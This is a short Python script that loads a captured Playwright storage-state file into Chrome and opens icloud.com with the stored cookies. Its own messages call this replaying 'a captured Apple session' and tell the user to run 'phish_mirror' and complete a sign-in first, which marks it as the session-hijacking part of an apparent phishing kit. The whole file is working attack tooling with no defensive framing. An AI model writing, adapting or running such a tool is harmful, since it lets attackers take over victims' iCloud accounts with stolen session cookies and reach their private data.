#!/usr/bin/env python3
"""Open icloud.com in Chrome using a captured Playwright storage-state.json."""

from __future__ import annotations

import argparse
from pathlib import Path

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).parent
DEFAULT_STATE = ROOT / 'captured' / 'storage-state.json'


def main() -> int:
    p = argparse.ArgumentParser(description='Replay a captured Apple session in Chrome.')
    p.add_argument(
        '--state',
        type=Path,
        default=DEFAULT_STATE,
        help='Path to storage-state.json from mirror capture',
    )
    p.add_argument('--channel', default='chrome', help='Playwright channel (chrome, msedge, chromium)')
    p.add_argument('--url', default='https://www.icloud.com/', help='URL to open after injecting cookies')
    args = p.parse_args()

    if not args.state.is_file():
        print(f'Missing {args.state}. Run phish_mirror and complete a sign-in first.', flush=True)
        return 1

    with sync_playwright() as pw:
        browser = pw.chromium.launch(channel=args.channel, headless=False)
        context = browser.new_context(storage_state=str(args.state.resolve()))
        page = context.new_page()
        page.goto(args.url, wait_until='domcontentloaded', timeout=120_000)
        print('Loaded with captured cookies. Close the browser window or press Enter here.', flush=True)
        try:
            input()
        except KeyboardInterrupt:
            pass
        context.close()
        browser.close()
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
